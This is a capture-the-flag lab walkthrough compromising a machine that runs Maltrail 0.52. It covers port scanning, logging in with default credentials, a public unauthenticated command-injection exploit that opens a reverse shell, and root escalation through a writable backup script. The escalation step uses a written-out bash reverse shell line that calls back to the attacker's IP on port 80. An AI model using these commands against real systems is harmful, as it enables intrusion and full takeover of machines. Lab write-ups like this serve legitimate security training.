CTF-Labor-200-01

Target IP: 192.168.242.32
Challenge Description: Part 1 of Labor Day CTF Machine.

Reconnaissance


Performing a port scan using the command sudo nmap -sS 192.168.242.32 -p- against the target machine shows there are three TCP ports open. They are SSH on port 22, HTTP on port 80, and some unknown application on port 8338. I need to find more information about this application.


I performed an aggressive port scan against the three open TCP ports and received the result above. The HTTP application on port 80 is displaying the default Apache2 webpage. However, the application on port 8338 is interesting as it is running Maltrail 0.52 as shown above. Is this application vulnerable?

Enumeration

Port 8338: Maltrail 0.52

The webpage above is displayed for this application on this port. The webpage contains the application name & version.


And this application seems to be vulnerable to unauthenticated RCE, as shown above. The OS injection seems to occur during the login process, specifically the username parameter. Since the target machine is running the version 0.52, it is affected.


After digging for some public exploits, I found the Github repository with exploit above. Before launching exploits against the target machine, I wish to enumerate this application further.


I found the default credentials for this application by researching online. The default credentials for this application seems to be admin:changeme!. And bingo! Using the default credentials at the login page, I gained access to the application as the user admin as shown above. Although I had access to the application as the user admin, I was not able to do anything else. Time to try the exploits.

Exploitation


I downloaded the exploit from this Github repository . Then I removed the /login from line 28, as shown above. Time to test the exploit against the target machine.


I notice the target machine has firewall settings enabled; therefore, port 80 outbound connection worked for me. I started a listener on my machine at port 80, as shown above in the top terminal. Then I launched the exploit using the command python3 exp.py 192.168.45.203 80 http://192.168.242.32:8338/login, as shown above in the bottom terminal. Then I instantly received a reverse shell connection with the session as snort from the target machine on my machine at port 80. Now I have a foothold on the target machine.

Privilege Escalation


There is only one user on the target machine: snort. Running the command find / -writable -type f 2>/dev/null shows the interesting entry with the name /var/backups/etc_Backup.sh as shown above. Is this a cronjob?


The contents of the /var/backups/etc_Backup.sh is shown above. It makes a backup copy of the /etc to a tar file with the name etc_backup. It is owned by the user root. Maybe I can obtain a root reverse shell?


Since the target machine only allows port 80 outbound connection, I replaced the contents of /var/backups/etc_Backup.sh with a bash reverse shell as shown above. The commands I used are echo '#!/bin/bash' > /var/backups/etc_Backup.sh and echo '/bin/bash -i >& /dev/tcp/192.168.45.203/80 0>&1' >> /var/backups/etc_Backup.sh. Then I terminated the exploit session, and started a listener again on the same port to catch the reverse shell.


And bingo! I immediately obtained a root reverse shell on port 80, as shown above. Now I have full privileges on the target machine from my machine.

Flags

The proof.txt and email1.txt are shown above. These flags are obtainable after escalating privileges to the user root.
